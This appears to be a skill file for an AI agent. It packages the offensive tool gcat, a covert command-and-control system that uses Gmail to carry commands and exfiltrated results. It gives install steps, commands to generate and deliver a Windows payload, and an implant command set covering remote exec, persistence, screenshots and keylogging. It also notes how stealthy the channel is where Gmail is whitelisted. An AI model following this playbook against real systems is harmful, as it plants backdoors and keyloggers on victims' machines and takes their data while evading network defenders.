---
name: gcat-gmail-c2
description: "gcat provides Gmail-channel covert C2. Signals: persistence, backdoor, interactive control, command set, Gmail attachment switching."
zh-signals: "gcat: Gmail 信道隐蔽 C2。信号:持久化,后门,交互式控制,指令集,切换 Gmail 附件。"
when-to-use: >-
  Use when establishing a covert Gmail-based C2 channel for persistence and remote
  control inside a restricted network that permits Gmail.
---

# gcat

- Attack Category: C15 C2 and Remote Control
- Upstream Repository: https://github.com/byt3bl33d3r/gcat
- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/byt3bl33d3r/gcat && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python gcat.py -g` | Generate a Windows payload |
| `python gcat.py -i keylog_interval` | Interactive control |
| ` implants commands: exec / persistence / screenshot / keylogger` | Command set |
| `--new-image` | Switch the Gmail attachment |

## Attack Scenario Playbook

### Gmail-Channel Covert C2

```bash
python gcat.py -g  # Generate the payload and deliver it
python gcat.py  # Receive commands by email and return screenshots
```

## Notes

Made by byt3bl33d3r, using Gmail as the C2 channel (commands delivered by email, results returned as attachments); extremely stealthy when the domain controller whitelists Gmail.
